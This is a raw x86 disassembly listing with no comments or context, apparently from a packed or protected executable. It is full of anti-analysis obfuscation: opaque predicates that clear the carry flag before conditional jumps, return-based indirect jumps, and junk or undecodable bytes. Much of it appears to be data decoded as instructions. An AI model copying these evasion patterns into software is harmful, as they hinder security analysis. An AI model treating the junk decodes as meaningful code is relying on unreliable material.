  40cf95:	outs   dx,BYTE PTR ds:[esi]
  40cf96:	jne    0x40f5a2
  40cf9c:	pushf  
  40cf9d:	and    WORD PTR [esp],0xfe
  40cfa3:	popf   
  40cfa4:	jae    0x40a767
  40cfaa:	loope  0x40cf7d
  40cfac:	ins    DWORD PTR es:[di],dx
  40cfae:	mov    ch,0x82
  40cfb0:	(bad)  
  40cfb1:	mov    al,ds:0xcc56b5b5
  40cfb6:	int3   
  40cfb7:	int3   
	...
  40cfd0:	add    BYTE PTR [eax],al
  40cfd2:	add    dl,bl
  40cfd4:	mov    ecx,0x938
  40cfd9:	push   ebx
  40cfda:	ss nop
  40cfdc:	ds mov ebx,0x40cc73
  40cfe2:	xchg   DWORD PTR ds:[esp],ebx
  40cfe6:	bnd ret 0x0
  40cfea:	(bad)  
  40cfeb:	sbb    eax,0x848f0867
  40cff0:	dec    ebx
  40cff1:	dec    edx
  40cff2:	in     eax,0xd2
  40cff4:	jb     0x40ca74
  40cffa:	push   ecx
  40cffb:	nop
  40cffc:	es repz mov ecx,0x40c7ba
  40d003:	xacquire xchg DWORD PTR [esp],ecx
  40d007:	repz ret 0x0
  40d00b:	ins    DWORD PTR es:[edi],dx
  40d00c:	sbb    eax,0xb567b5ae
  40d011:	mov    ch,0xb0
  40d013:	(bad)  
  40d014:	mov    DWORD PTR [esp+0x1c],edi
  40d018:	pushf  
  40d019:	and    WORD PTR [esp],0xfe
  40d01f:	popf   
  40d020:	jae    0x40bdb8
  40d026:	and    cl,0x67
  40d029:	jge    0x40d076
  40d02b:	scas   al,BYTE PTR es:[edi]
  40d02c:	jle    0x40d04f
  40d02e:	mov    ch,0xfc
  40d030:	mov    ch,0xb5
  40d032:	mov    ebx,0x36245d03
  40d037:	es jmp 0x40e593
  40d03d:	ror    DWORD PTR [edx-0x4b],1
  40d040:	sub    al,0x8
  40d042:	fidivr WORD PTR [esi+0x7dfc4ab5]
  40d048:	jl     0x40d0b1
  40d04a:	mov    al,ds:0x212c4b1d
  40d04f:	inc    ecx
  40d050:	and    DWORD PTR [edi-0x2f],eax
  40d053:	loop   0x40d0ab
  40d055:	cld    
  40d056:	nop
  40d057:	cld    
  40d058:	lea    esi,ds:0x40b56a
  40d05e:	xchg   DWORD PTR es:[esp],esi
  40d062:	cs ret 0x0
  40d066:	mov    ch,0xb5
  40d068:	ficom  WORD PTR [ebx-0x4]
  40d06b:	mov    ch,0xae
  40d06d:	mov    ch,0x4b
  40d06f:	sbb    eax,0x3351e595
  40d074:	add    esi,DWORD PTR [ebp+0x24]
  40d077:	pushf  
  40d078:	and    WORD PTR [esp],0xfe
  40d07e:	popf   
  40d07f:	jae    0x40ce7f
  40d085:	and    DWORD PTR [ebp-0x32e4ab5],esi
  40d08b:	(bad)  
  40d08c:	jge    0x40d03c
  40d08e:	dec    ebx
  40d08f:	pop    ecx
  40d090:	sar    DWORD PTR [ebp-0x1c],1
  40d093:	(bad)  
  40d094:	(bad)  
  40d095:	int3   
  40d096:	int3   
  40d097:	int3   
	...
  40d0b0:	add    BYTE PTR [eax],al
  40d0b2:	add    BYTE PTR [edi-0x7e9963ad],bh
  40d0b8:	and    al,0x24
  40d0ba:	inc    BYTE PTR [eax]
  40d0bc:	popf   
  40d0bd:	jae    0x40aa6e
  40d0c3:	mov    ch,0xd1
  40d0c5:	or     BYTE PTR [eax],0x59
  40d0c8:	or     BYTE PTR ds:0x21e1c667,bl
  40d0ce:	mov    ch,0x84
  40d0d0:	mov    al,ds:0x5e8b9f53
  40d0d5:	or     al,0x3e
  40d0d7:	bnd jmp 0x40d033
  40d0dd:	and    DWORD PTR [ecx+0x7d],eax
  40d0e0:	adc    al,0xb5
  40d0e2:	scas   al,BYTE PTR es:[edi]
  40d0e3:	inc    ecx
  40d0e4:	mov    al,cs:0xd153d1d1
  40d0ea:	adc    al,0x8
  40d0ec:	scas   al,BYTE PTR es:[edi]
  40d0ed:	mov    ch,0x41
  40d0ef:	scas   al,BYTE PTR es:[edi]
  40d0f0:	lahf   
  40d0f1:	lods   eax,DWORD PTR ds:[esi]
  40d0f2:	out    0x57,eax
  40d0f4:	cld    
  40d0f5:	ds cs jmp 0x40ab68
  40d0fc:	and    DWORD PTR [ebp+0x6daeb56d],esi
  40d102:	inc    ecx
  40d103:	cmp    BYTE PTR [esi+0x41],0xb5
  40d107:	addr16 cld 
  40d109:	loope  0x40d12c
  40d10b:	sub    al,0x9f
  40d10d:	and    DWORD PTR [edi-0x74e4de7e],ebx
  40d113:	clc    
  40d114:	nop
  40d115:	ds bnd jmp 0x40bb09
  40d11c:	test   BYTE PTR [ecx-0x4b],bl
  40d11f:	mov    ch,0xb5
  40d121:	sbb    eax,0xe1b56db5
  40d126:	and    DWORD PTR [edi+0x671021a0],ecx
  40d12c:	dec    edx
  40d12d:	dec    ebx
  40d12e:	scas   al,BYTE PTR es:[edi]
  40d12f:	inc    ecx
  40d130:	cmp    DWORD PTR [ebx+0x2e0ae280],ebp
  40d136:	bnd jmp 0x40ea9f
  40d13c:	dec    edx
  40d13d:	and    DWORD PTR [edx-0x7b8392df],eax
  40d143:	lahf   
  40d144:	adc    BYTE PTR cs:[esi+0x8ae824b],ch
  40d14b:	dec    edx
  40d14c:	mov    ch,0x21
  40d14e:	jl     0x40d0fe
  40d150:	sub    al,0xff
  40d152:	int3   
  40d153:	int3   
  40d154:	int3   
	...
  40d16d:	add    BYTE PTR [eax],al
  40d16f:	add    BYTE PTR [ebp-0x6e],al
  40d172:	call   DWORD PTR [ebp+0x10]
  40d175:	cs pause 
  40d178:	jmp    0x40f0ca
  40d17d:	adc    al,0x53
  40d17f:	adc    al,0xb5
  40d181:	mov    ch,0xb5
  40d183:	loope  0x40d13a
  40d185:	and    DWORD PTR [ebp-0x7d51de93],esi
  40d18b:	ins    DWORD PTR es:[edi],dx
  40d18c:	test   dh,bl
  40d18e:	push   ebx
  40d18f:	or     BYTE PTR [esp+eax*1],bl
  40d192:	sub    eax,0x895e0000
  40d197:	inc    ebp
  40d198:	sbb    BYTE PTR [eax-0x8d16d2],dl
  40d19e:	(bad)  
  40d19f:	inc    DWORD PTR [edi+ebx*4-0x397bd152]
  40d1a6:	dec    edx
  40d1a7:	pop    ecx
  40d1a8:	pop    DWORD PTR [edi+ecx*4+0x7d8fb5b5]
  40d1af:	lahf   
  40d1b0:	adc    al,0xbe
  40d1b2:	rol    DWORD PTR [ecx+0x13],1
  40d1b5:	pop    esi
  40d1b6:	push   ebp
  40d1b7:	repz repnz es mov ebp,0x40d823
  40d1bf:	cld    
  40d1c0:	xchg   DWORD PTR [esp],ebp
  40d1c3:	repz ret 0x0
  40d1c7:	addr16 mov ch,0x10
  40d1ca:	scas   al,BYTE PTR es:[edi]
  40d1cb:	mov    ch,0x8f
  40d1cd:	cs inc ecx
  40d1cf:	cs (bad) 
  40d1d1:	ins    DWORD PTR es:[edi],dx
  40d1d2:	jl     0x40d22b
  40d1d4:	cld    
  40d1d5:	push   eax
  40d1d6:	repnz nop
  40d1d8:	ss mov eax,0x40ebbe
  40d1de:	xchg   DWORD PTR ss:[esp],eax
  40d1e2:	repz ret 0x0
  40d1e6:	mov    ch,0x82
  40d1e8:	mov    al,ds:0xc6fcd1e1
  40d1ed:	scas   al,BYTE PTR es:[edi]
  40d1ee:	or     BYTE PTR [ebx-0x4b],dl
  40d1f1:	rol    DWORD PTR [edi-0x7f],1
  40d1f4:	loope  0x40d1f5
  40d1f6:	sldt   WORD PTR [eax]
  40d1f9:	pushf  
  40d1fa:	and    WORD PTR [esp],0xfe
  40d200:	popf   
  40d201:	jae    0x40c2cc
  40d207:	mov    ch,0xb5
  40d209:	(bad)  
  40d20a:	cs jle 0x40d1cb
  40d20d:	mov    ch,0x2e
  40d20f:	fidivr WORD PTR cs:[edx-0x7e9963a7]
  40d216:	and    al,0x24
  40d218:	inc    BYTE PTR [eax]
  40d21a:	popf   
  40d21b:	jae    0x40a4d0
  40d221:	(bad)  
  40d222:	mov    ch,0x59
  40d224:	or     BYTE PTR [ebp+0x5308416d],dh
  40d22a:	jge    0x40d1b0
  40d22c:	jl     0x40d20f
  40d22e:	dec    edx
  40d22f:	or     BYTE PTR [ecx+ecx*1+0xa8cc],bl
  40d236:	leave  
  40d237:	jge    0x40d249
  40d239:	pop    eax
  40d23a:	dec    esp
  40d23b:	fld    DWORD PTR [eax]
  40d23d:	add    bl,cl
  40d23f:	push   esi
  40d240:	cld    
  40d241:	es jmp 0x40d579
  40d247:	xor    BYTE PTR [ebp+0x142c6d21],0x7d
  40d24e:	scas   al,BYTE PTR es:[edi]
  40d24f:	mov    ch,0x53
  40d251:	rol    DWORD PTR [ecx-0x61],1
  40d254:	and    DWORD PTR cs:[ecx+0x4a],ebx
  40d258:	mov    ch,0x21
  40d25a:	test   BYTE PTR [eax-0x625304],ah
  40d260:	jne    0x40ad72
  40d266:	pushf  
  40d267:	and    WORD PTR [esp],0xfe
  40d26d:	popf   
  40d26e:	jae    0x40d052
  40d274:	fidivr WORD PTR cs:[ecx+eax*2+0x7e]
  40d279:	rol    DWORD PTR [edx+0x49a07ed1],1
  40d27f:	mov    ds:0xd0bb850f,eax
  40d284:	(bad)  
  40d285:	push   DWORD PTR [esi]
  40d287:	cld    
  40d288:	bnd jmp 0x40b169
  40d28e:	sbb    eax,0xbe106d7d
  40d293:	(bad)  
  40d294:	dec    ebx
  40d295:	inc    ecx
  40d296:	jl     0x40d246
  40d298:	(bad)  
  40d299:	fidiv  WORD PTR [ebp+0x627c2c9f]
  40d29f:	jmp    0x40b1c6
  40d2a4:	pushf  
  40d2a5:	and    WORD PTR [esp],0xfe
  40d2ab:	popf   
  40d2ac:	jae    0x40a4b1
  40d2b2:	dec    edx
  40d2b3:	shl    DWORD PTR [ebp-0x4a4ae282],1
  40d2b9:	and    DWORD PTR [ebp+0x2244ab5],esi
  40d2bf:	push   esi
  40d2c0:	pushf  
  40d2c1:	and    WORD PTR [esp],0xfe
  40d2c7:	popf   
  40d2c8:	jae    0x40a25a
  40d2ce:	lahf   
  40d2cf:	or     BYTE PTR [edi+0x4b],ah
  40d2d2:	mov    ch,0xae
  40d2d4:	dec    ebx
  40d2d5:	jle    0x40d2b5
  40d2d7:	push   ebx
  40d2d8:	sbb    eax,0x84218241
  40d2dd:	and    eax,0xc9877f10
  40d2e2:	pushf  
  40d2e3:	and    WORD PTR [esp],0xfe
  40d2e9:	popf   
  40d2ea:	jae    0x40f65e
  40d2f0:	pop    ecx
  40d2f1:	test   BYTE PTR [di-0x514b],dh
  40d2f6:	and    DWORD PTR [ebp-0x70707d4b],esi
  40d2fc:	dec    edx
  40d2fd:	mov    ch,0xbd
  40d2ff:	je     0x40d35e
  40d301:	dec    edi
  40d302:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d304:	pushf  
  40d305:	and    WORD PTR [esp],0xfe
  40d30b:	popf   
  40d30c:	jae    0x40b924
  40d312:	test   BYTE PTR [edx+0x10],cl
  40d315:	addr16 push ebx
  40d317:	jle    0x40d2f7
  40d319:	mov    ch,0xd1
  40d31b:	mov    ch,0xa0
  40d31d:	addr16 cs mov ch,0x48
  40d321:	mov    cl,0x0
  40d323:	add    BYTE PTR [esi+0x3c],ah
  40d326:	popa   
  40d327:	cld    
  40d328:	ss nop
  40d32a:	jmp    0x40a191
  40d32f:	mov    ch,0x6d
  40d331:	or     BYTE PTR [ecx+0x7d],bl
  40d334:	pop    ecx
  40d335:	push   ebx
  40d336:	dec    ebx
  40d337:	mov    ch,0x7c
  40d339:	loope  0x40d3b7
  40d33b:	inc    ecx
  40d33c:	loope  0x40d37f
  40d33e:	mov    ch,0x53
  40d340:	dec    ebx
  40d341:	inc    ecx
  40d342:	mov    ch,0xf6
  40d344:	push   esi
  40d345:	pushf  
  40d346:	and    WORD PTR [esp],0xfe
  40d34c:	popf   
  40d34d:	jae    0x40a2e0
  40d353:	or     BYTE PTR [ebp-0x5f81813a],dh
  40d359:	mov    esi,0x8f9fb57e
  40d35e:	cmp    ah,0xb5
  40d361:	dec    ebx
  40d362:	fs jae 0x40d368
  40d365:	pause  
  40d367:	es jmp 0x40a217
  40d36d:	loope  0x40d324
  40d36f:	adc    al,0x10
  40d371:	and    DWORD PTR [esi+eax*8],ebp
  40d374:	mov    esi,0x67ae4a41
  40d379:	jl     0x40d383
  40d37b:	inc    ecx
  40d37c:	or     BYTE PTR [ebp+0x534ab541],dh
  40d382:	iret   
  40d383:	jmp    0x40cdda
  40d388:	pushf  
  40d389:	and    WORD PTR [esp],0xfe
  40d38f:	popf   
  40d390:	jae    0x40a824
  40d396:	adc    BYTE PTR [ecx],ah
  40d398:	and    DWORD PTR [ebx+0x53],edx
  40d39b:	scas   al,BYTE PTR es:[edi]
  40d39c:	lahf   
  40d39d:	jl     0x40d41b
  40d39f:	and    DWORD PTR [ebx+ebp*4],ebp
  40d3a2:	popa   
  40d3a3:	repz repz jmp 0x40b6ee
  40d3aa:	jl     0x40d361
  40d3ac:	mov    ch,0x1d
  40d3ae:	mov    ch,0xfc
  40d3b0:	or     dh,bl
  40d3b2:	and    DWORD PTR [ebx+0x6d],edx
  40d3b5:	and    DWORD PTR [ebp+0x7d84b51d],esi
  40d3bb:	mov    ch,0x84
  40d3bd:	mov    ch,0xc6
  40d3bf:	adc    BYTE PTR [esi-0x7e996337],dh
  40d3c5:	and    al,0x24
  40d3c7:	inc    BYTE PTR [eax]
  40d3c9:	popf   
  40d3ca:	jae    0x40c57c
  40d3d0:	mov    al,ds:0xb5821dae
  40d3d5:	adc    BYTE PTR [ebx+0x7c],0xa0
  40d3d9:	sbb    eax,0xb5087d6d
  40d3de:	mov    ch,0xff
  40d3e0:	pop    edi
  40d3e1:	pushf  
  40d3e2:	and    WORD PTR [esp],0xfe
  40d3e8:	popf   
  40d3e9:	jae    0x40c199
  40d3ef:	jge    0x40d43c
  40d3f1:	loope  0x40d382
  40d3f3:	cs (bad) 
  40d3f5:	fimul  WORD PTR [eax]
  40d3f7:	mov    ch,0xde
  40d3f9:	ins    DWORD PTR es:[edi],dx
  40d3fa:	scas   al,BYTE PTR es:[edi]
  40d3fb:	ins    DWORD PTR es:[edi],dx
  40d3fc:	sbb    eax,0x68b64a
  40d401:	add    eax,0x36fc0000
  40d406:	ds jmp 0x40ef44
  40d40c:	mov    ch,0xa0
  40d40e:	inc    ecx
  40d40f:	cmp    ah,0x7c
  40d412:	pop    ecx
  40d413:	pop    ecx
  40d414:	ins    DWORD PTR es:[edi],dx
  40d415:	scas   al,BYTE PTR es:[edi]
  40d416:	mov    ch,0xb5
  40d418:	mov    ch,0x8f
  40d41a:	and    DWORD PTR [ebp-0x72a50742],esi
  40d420:	outs   dx,DWORD PTR ds:[esi]
  40d421:	loopne 0x40d476
  40d423:	ss nop
  40d425:	nop
  40d426:	mov    ebx,0x40b826
  40d42b:	xchg   DWORD PTR ds:[esp],ebx
  40d42f:	cld    
  40d430:	ret    0x0
  40d433:	mov    ch,0x59
  40d435:	mov    al,ds:0x532cb521
  40d43a:	dec    edx
  40d43b:	test   BYTE PTR [esp+edi*1],dl
  40d43e:	xor    ebp,DWORD PTR [ebx]
  40d440:	rcr    DWORD PTR [esi+eiz*2-0x1dbdb7f],0x0
  40d448:	popf   
  40d449:	jae    0x40f338
  40d44f:	jge    0x40d4cf
  40d451:	(bad)  
  40d452:	jl     0x40d412
  40d454:	jge    0x40d45e
  40d456:	mov    ch,0x84
  40d458:	lahf   
  40d459:	sbb    eax,0x63b50882
  40d45e:	push   0x6b
  40d460:	push   ebx
  40d461:	repz cld 
  40d463:	lea    ebx,ds:0x40e673
  40d46a:	xchg   DWORD PTR es:[esp],ebx
  40d46e:	ss ret 0x0
  40d472:	pop    ecx
  40d473:	mov    ch,0xb5
  40d475:	jl     0x40d47f
  40d477:	lahf   
  40d478:	mov    ch,0x53
  40d47a:	jle    0x40d4cf
  40d47c:	sub    eax,0xcccccc63
	...
  40d499:	add    BYTE PTR [eax],al
  40d49b:	add    BYTE PTR [esi+0x57],al
  40d49e:	pushf  
  40d49f:	and    WORD PTR [esp],0xfe
  40d4a5:	popf   
  40d4a6:	jae    0x40d7e3
  40d4ac:	test   BYTE PTR [ebp+0x532121de],dh
  40d4b2:	sbb    eax,0x10e1a008
  40d4b7:	mov    esi,0xbe6d9f9f
  40d4bc:	mov    ecx,0x28296
  40d4c1:	repz cld 
  40d4c3:	cld    
  40d4c4:	jmp    0x40aece
  40d4c9:	scas   al,BYTE PTR es:[edi]
  40d4ca:	or     BYTE PTR [ecx+edx*8-0x4b],bh
  40d4ce:	fidiv  WORD PTR [ebp-0x7003acf8]
  40d4d4:	sub    al,0xb5
  40d4d6:	mov    ch,0x4b
  40d4d8:	mov    ch,0xae
  40d4da:	retf   0xcb8b
  40d4dd:	pushf  
  40d4de:	and    WORD PTR [esp],0xfe
  40d4e4:	popf   
  40d4e5:	jae    0x40ee23
  40d4eb:	cld    
  40d4ec:	jl     0x40d4cf
  40d4ee:	mov    ch,0x10
  40d4f0:	cs dec edx
  40d4f2:	mov    ch,0x84
  40d4f4:	loope  0x40d541
  40d4f6:	cld    
  40d4f7:	(bad)  
  40d4f8:	sub    al,0x32
  40d4fa:	push   eax
  40d4fb:	pushf  
  40d4fc:	and    WORD PTR [esp],0xfe
  40d502:	popf   
  40d503:	jae    0x40d0b4
  40d509:	adc    BYTE PTR [ebp-0x1eebde4b],dh
  40d50f:	ins    DWORD PTR es:[edi],dx
  40d510:	add    BYTE PTR [ecx+eiz*1-0x3604a60],0xb5
  40d518:	ror    DWORD PTR [esi],0xcc
  40d51b:	int3   
  40d51c:	int3   
	...
  40d535:	add    BYTE PTR [eax],al
  40d537:	add    dh,dl
  40d539:	push   ecx
  40d53a:	pushf  
  40d53b:	and    WORD PTR [esp],0xfe
  40d541:	popf   
  40d542:	jae    0x40a5e0
  40d548:	mov    ch,0x67
  40d54a:	dec    edx
  40d54b:	and    DWORD PTR [eax],edx
  40d54d:	(bad)  
  40d54e:	mov    esi,0xb5a02c4a
  40d553:	mov    ch,0x59
  40d555:	(bad)  
  40d556:	adc    al,0xe7
  40d558:	pop    edx
  40d559:	pushf  
  40d55a:	and    WORD PTR [esp],0xfe
  40d560:	popf   
  40d561:	jae    0x40e9c0
  40d567:	mov    ch,0xe1
  40d569:	rcl    DWORD PTR [eax+ecx*1],1
  40d56c:	adc    al,0xa0
  40d56e:	dec    ebx
  40d56f:	mov    ch,0x67
  40d571:	mov    al,ds:0x2153b559
  40d576:	push   eax
  40d577:	test   al,0x77
  40d579:	push   ebx
  40d57a:	ss es jmp 0x40f3b9
  40d581:	mov    al,ds:0xe121b5de
  40d586:	mov    ch,0x53
  40d588:	and    DWORD PTR [ecx],esp
  40d58a:	mov    ch,0x7c
  40d58c:	inc    ecx
  40d58d:	sub    al,0xb5
  40d58f:	or     BYTE PTR [ecx+edx*8-0x2eef4ab5],al
  40d596:	scas   al,BYTE PTR es:[edi]
  40d597:	retf   
  40d598:	push   ecx
  40d599:	pushf  
  40d59a:	and    WORD PTR [esp],0xfe
  40d5a0:	popf   
  40d5a1:	jae    0x40b64b
  40d5a7:	pop    esi
  40d5a9:	ins    DWORD PTR es:[edi],dx
  40d5aa:	scas   al,BYTE PTR es:[edi]
  40d5ab:	sub    al,0x2c
  40d5ad:	mov    ch,0x8
  40d5af:	sub    BYTE PTR [esi],0x4b
  40d5b2:	pop    DWORD PTR [ecx-0x4b]
  40d5b5:	mov    esi,0x49b2a405
  40d5ba:	pushf  
  40d5bb:	and    WORD PTR [esp],0xfe
  40d5c1:	popf   
  40d5c2:	jae    0x40cad6
  40d5c8:	mov    ch,0x1d
  40d5ca:	push   ebx
  40d5cb:	sub    al,0x53
  40d5cd:	sar    esp,1
  40d5cf:	adc    al,0x21
  40d5d1:	mov    ch,0xd1
  40d5d3:	dec    edx
  40d5d4:	push   ebx
  40d5d5:	and    DWORD PTR [ecx],esp
  40d5d7:	and    edx,DWORD PTR [eax+0x63e9f2f2]
  40d5dd:	push   es
  40d5de:	add    BYTE PTR [eax],al
  40d5e0:	addr16 dec edx
  40d5e2:	mov    ch,0x4a
  40d5e4:	xor    BYTE PTR [ebp+0x8b510ae],0xe1
  40d5eb:	(bad)  
  40d5ec:	adc    BYTE PTR [ecx],ah
  40d5ee:	mov    ch,0xb5
  40d5f0:	mov    ch,0x4b
  40d5f2:	pop    ecx
  40d5f3:	cld    
  40d5f4:	test   BYTE PTR [esp+ebx*1-0x61],bh
  40d5f8:	pushf  
  40d5f9:	repnz cld 
  40d5fb:	nop
  40d5fc:	jmp    0x40c695
  40d601:	scas   al,BYTE PTR es:[edi]
  40d602:	loope  0x40d614
  40d604:	scas   al,BYTE PTR es:[edi]
  40d605:	loope  0x40d648
  40d607:	mov    al,ds:0x7c085921
  40d60c:	mov    ch,0xb5
  40d60e:	jl     0x40d65a
  40d610:	ins    DWORD PTR es:[edi],dx
  40d611:	adc    al,0x53
  40d613:	dec    edx
  40d614:	mov    ch,0x10
  40d616:	mov    ah,0x4d
  40d618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d619:	das    
  40d61a:	add    esp,0x200
  40d620:	es bnd ss jmp 0x40a1d6
  40d628:	dec    edx
  40d629:	jge    0x40d64c
  40d62b:	cld    
  40d62c:	or     cl,ah
  40d62e:	and    DWORD PTR [esi],ebp
  40d630:	mov    esi,0xe121fc10
  40d635:	mov    esi,0x96c42cae
  40d63a:	add    BYTE PTR [eax],al
  40d63c:	ret    0x4e8b
  40d63f:	adc    BYTE PTR [esi],bh
  40d641:	repz jmp 0x40bf3f
  40d647:	mov    al,ds:0x108f6d2e
  40d64c:	sar    DWORD PTR [esi+0x2ee1216d],1
  40d652:	mov    ch,0xb5
  40d654:	dec    ebx
  40d655:	test   BYTE PTR [ebp+0x4153217d],dh
  40d65b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d65c:	pop    edi
  40d65d:	cs ds jmp 0x40a362
  40d664:	loope  0x40d5f5
  40d666:	test   BYTE PTR [ebp+0x14d15959],dh
  40d66c:	mov    ch,0xbe
  40d66e:	mov    ch,0x1d
  40d670:	(bad)  
  40d671:	cld    
  40d672:	mov    ch,0x2c
  40d674:	or     BYTE PTR [ebp+0x1082b5b5],dh
  40d67a:	sbb    DWORD PTR [ebx+0x669cabf3],ecx
  40d680:	and    DWORD PTR [esp],0xf9d00fe
  40d687:	adc    DWORD PTR [eax+ecx*1],0x0
  40d68b:	add    cl,ah
  40d68d:	push   ebx
  40d68e:	or     BYTE PTR [esi+ebp*1],ch
  40d691:	lahf   
  40d692:	cs dec edx
  40d694:	test   BYTE PTR [edi+ebx*4-0x60],bh
  40d698:	jle    0x40d6bb
  40d69a:	xchg   DWORD PTR [ebp+0x669c3214],ecx
  40d6a0:	and    DWORD PTR [esp],0xf9d00fe
  40d6a7:	xor    esp,0x5
  40d6aa:	add    BYTE PTR [eax],al
  40d6ac:	sub    al,0x4b
  40d6ae:	dec    edx
  40d6af:	cs lahf 
  40d6b1:	or     BYTE PTR [edi+0x21],ah
  40d6b4:	dec    ebx
  40d6b5:	cld    
  40d6b6:	mov    ch,0x7d
  40d6b8:	ins    DWORD PTR es:[edi],dx
  40d6b9:	pop    edx
  40d6ba:	add    eax,DWORD PTR [ebp+0x24]
  40d6bd:	nop
  40d6be:	repz ds jmp 0x40acce
  40d6c5:	mov    ch,0xb5
  40d6c7:	pop    ecx
  40d6c8:	mov    ch,0xb5
  40d6ca:	mov    al,ds:0x4a4a21c6
  40d6cf:	fisub  WORD PTR [ecx]
  40d6d1:	sub    al,0x6d
  40d6d3:	adc    al,0x53
  40d6d5:	dec    ebx
  40d6d6:	mov    ch,0x84
  40d6d8:	mov    DWORD PTR ds:0x669c5813,ebx
  40d6de:	and    DWORD PTR [esp],0xf9d00fe
  40d6e5:	cmp    DWORD PTR [edi],0xffffffd4
  40d6e8:	(bad)  
  40d6e9:	(bad)  
  40d6ea:	jge    0x40d6a1
  40d6ec:	push   ebx
  40d6ed:	(bad)  
  40d6ee:	sub    al,0xe1
  40d6f0:	mov    ch,0xb5
  40d6f2:	and    DWORD PTR [ebp-0x39de7060],esi
  40d6f8:	mov    ch,0x52
  40d6fa:	int3   
  40d6fb:	int3   
  40d6fc:	int3   
	...
  40d715:	add    BYTE PTR [eax],al
  40d717:	add    al,cl
  40d719:	enter  0x0,0x35
  40d71d:	mov    BYTE PTR [esi-0x24dc0000],al
  40d723:	add    esp,0x10
  40d726:	cld    
  40d727:	es jmp 0x40e0e5
  40d72d:	(bad)  
  40d72e:	(bad)  
  40d72f:	jl     0x40d79e
  40d731:	and    BYTE PTR [edi-0x4b],0x82
  40d735:	jle    0x40d6ec
  40d737:	scas   al,BYTE PTR es:[edi]
  40d738:	mov    ch,0xb5
  40d73a:	mov    esi,0x9f4a2c53
  40d73f:	mov    ch,0x21
  40d741:	and    DWORD PTR ds:0xd2331bb9,edi
  40d747:	pause  
  40d749:	cs jmp 0x40c1e3
  40d74f:	fidiv  WORD PTR [ebp-0x4aac5ff0]
  40d755:	mov    al,ds:0x2e9f08b5
  40d75a:	ins    DWORD PTR es:[edi],dx
  40d75b:	dec    ebx
  40d75c:	addr16 (bad) 
  40d75e:	and    DWORD PTR [ebp-0x2a4a824b],esi
  40d764:	inc    esi
  40d765:	int3   
  40d766:	int3   
  40d767:	int3   
	...
  40d780:	add    BYTE PTR [eax],al
  40d782:	add    BYTE PTR [ebp+0x6dc681ca],dl
  40d788:	add    BYTE PTR [eax],al
  40d78a:	add    BYTE PTR [ebp+0x2e],dl
  40d78d:	cs nop
  40d78f:	mov    ebp,0x40c267
  40d794:	cld    
  40d795:	xchg   DWORD PTR [esp],ebp
  40d798:	ds ret 0x0
  40d79c:	push   ebx
  40d79d:	shl    DWORD PTR [ebp+0x211dbefc],1
  40d7a3:	test   al,0xbe
  40d7a5:	push   0x0
  40d7a7:	es repnz cld 
  40d7aa:	jmp    0x40f4f7
  40d7af:	and    DWORD PTR [eax+edx*1],ebp
  40d7b2:	(bad)  
  40d7b3:	mov    ch,0x67
  40d7b5:	mov    ch,0xb5
  40d7b7:	mov    ch,0x2e
  40d7b9:	ins    DWORD PTR es:[edi],dx
  40d7ba:	mov    ch,0x7d
  40d7bc:	lahf   
  40d7bd:	lahf   
  40d7be:	mov    ch,0x67
  40d7c0:	and    DWORD PTR [esi+ebx*8-0x16],edi
  40d7c4:	int3   
  40d7c5:	int3   
  40d7c6:	int3   
	...
  40d7df:	add    BYTE PTR [eax],al
  40d7e1:	add    BYTE PTR [edx],al
  40d7e3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7e5:	push   edx
  40d7e6:	es ss es mov edx,0x40b48b
  40d7ee:	xrelease xchg DWORD PTR [esp],edx
  40d7f2:	repz ret 0x0
  40d7f6:	adc    al,0x59
  40d7f8:	cld    
  40d7f9:	sbb    eax,0xb51084e1
  40d7fe:	adc    al,0xb5
  40d800:	scas   al,BYTE PTR es:[edi]
  40d801:	xchg   esi,eax
  40d802:	test   eax,eax
  40d804:	repnz cld 
  40d806:	bnd jmp 0x40bb2c
  40d80c:	dec    edx
  40d80d:	sub    al,0xae
  40d80f:	inc    ecx
  40d810:	mov    ch,0x10
  40d812:	jge    0x40d890
  40d814:	and    DWORD PTR [ebp+0x41b5d1b5],esi
  40d81a:	adc    cl,ah
  40d81c:	sbb    eax,0x2cb54108
  40d821:	clc    
  40d822:	(bad)  
  40d823:	pop    ebp
  40d824:	ds bnd jmp 0x40c476
  40d82b:	cs mov ch,0x8
  40d82e:	mov    ch,0x21
  40d830:	mov    ch,0x21
  40d832:	fisub  WORD PTR [ecx]
  40d834:	sbb    eax,0x6db5b521
  40d839:	and    DWORD PTR [eax],ecx
  40d83b:	addr16 mov esi,0x6dae101d
  40d841:	and    al,BYTE PTR [ebx-0xd6ffb3a]
  40d847:	ss jmp 0x40eb5f
  40d84d:	lahf   
  40d84e:	and    DWORD PTR [ecx],esp
  40d850:	mov    ch,0x14
  40d852:	dec    edx
  40d853:	mov    ch,0xb5
  40d855:	and    ecx,edx
  40d857:	push   ebx
  40d858:	ins    DWORD PTR es:[edi],dx
  40d859:	(bad)  
  40d85a:	push   ebx
  40d85b:	adc    BYTE PTR [edx-0x71],cl
  40d85e:	and    DWORD PTR [ebp+0x5f],edi
  40d861:	ret    
  40d862:	pushf  
  40d863:	and    WORD PTR [esp],0xfe
  40d869:	popf   
  40d86a:	jae    0x40dc81
  40d870:	or     dh,bl
  40d872:	ins    DWORD PTR es:[edi],dx
  40d873:	dec    edx
  40d874:	and    DWORD PTR [ebp+esi*4-0x4a818299],eax
  40d87b:	sbb    eax,0xe053be6d
  40d880:	sar    DWORD PTR [ecx+0x20],cl
  40d886:	pushf  
  40d887:	and    WORD PTR [esp],0xfe
  40d88d:	popf   
  40d88e:	jae    0x40d302
  40d894:	mov    ch,0x10
  40d896:	mov    ch,0x84
  40d898:	pop    ecx
  40d899:	mov    esi,0x6d141410
  40d89e:	adc    al,0xeb
  40d8a0:	shr    ecx,0x2
  40d8a3:	ss es jmp 0x40e3da
  40d8aa:	lahf   
  40d8ab:	mov    ch,0xfc
  40d8ad:	lahf   
  40d8ae:	push   ebx
  40d8af:	mov    ch,0xa0
  40d8b1:	or     BYTE PTR [bx+di],ah
  40d8b4:	and    DWORD PTR [ebp+0x810b5c6],esi
  40d8ba:	mov    al,ds:0xf8b567be
  40d8bf:	add    esp,DWORD PTR [eax-0x64]
  40d8c2:	and    WORD PTR [esp],0xfe
  40d8c8:	popf   
  40d8c9:	jae    0x40b08f
  40d8cf:	dec    edx
  40d8d0:	mov    ch,0x2e
  40d8d2:	mov    ch,0x41
  40d8d4:	adc    al,0x21
